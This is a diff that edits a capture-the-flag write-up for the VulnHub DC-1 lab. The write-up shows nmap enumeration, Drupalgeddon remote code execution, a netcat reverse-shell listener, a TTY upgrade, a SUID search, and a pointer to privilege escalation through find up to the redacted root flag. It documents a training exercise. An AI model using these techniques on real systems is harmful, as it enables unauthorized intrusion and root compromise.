@@ -4,7 +4,11 @@ author: H4
 ---
 # PG VULNHUB DC-1
 [Details](https://www.vulnhub.com/entry/dc-1,292/)
+
 ## enumeration
+
+Performing a `nmap` scan to identify the attack surface of the target.
+
 ### nmap
 ```bash
 nmap 192.168.200.193       
@@ -20,11 +24,9 @@ PORT    STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds
 ```
 
-### dir busting
+### web server (port 80)
 - `gobuster` did not reveal anything useful on the web server on port `80`
-
-### port 80
-- website with drupal installation
+- website with drupal installation  
 -> maybe vulnerable to `druaplgeddon`
 
 ---
@@ -76,14 +78,15 @@ DC-1>> whoami
 www-data
 ```
 
+Yay! RCE works!
+
 ---
 
 ## post exploitation
 ### full reverse shell
-- drupalgeddon deploys a simple `shell.php`
-- exploiting this to get a cute reverse shell
+`drupalgeddon` deploys a simple `shell.php` and we will exploit this to get a cute reverse shell.
 
-#### on attacker machine
+#### listener on attacker machine
 ```bash
 nc -lvp 80
 listening on [any] 80 ...
@@ -103,7 +106,7 @@ Cookie: has_js=1
 Connection: close
 ```
 
-#### reverse connection
+#### catch reverse connection
 ```bash
 nc -lvp 80
 listening on [any] 80 ...
@@ -133,7 +136,7 @@ stty raw -echo; fg
 www-data@DC-1:/var/www$ whoami 
 www-data
 ```
-now we got a fully interactive shell with autocomplete etc.
+Now we got a fully interactive shell with autocomplete etc. :)
 
 ### first flag
 ```bash
@@ -182,9 +185,9 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 -rwxr-sr-x 1 root shadow 30332 May  5  2012 /sbin/unix_chkpwd
 -rwsr-xr-x 1 root root 84532 May 22  2013 /sbin/mount.nfs
 ```
--> `find` looks juicy!
-
-- check `gtfobins` on how to exploit `find` for privesc
+-> `find` looks juicy!  
+  
+Check [gtfobins](https://gtfobins.github.io/) on how to exploit `find` to gain `root` access.
 
 ```bash
 www-data@DC-1:/home$ whereis find
@@ -202,4 +205,6 @@ proof.txt  thefinalflag.txt
 # cat proof.txt
 040ec3eeb86**********c55f2574131
 ```
--> `040ec3eeb86**********c55f2574131`
+-> `040ec3eeb86**********c55f2574131`  
+  
+Pwned! <@:-)
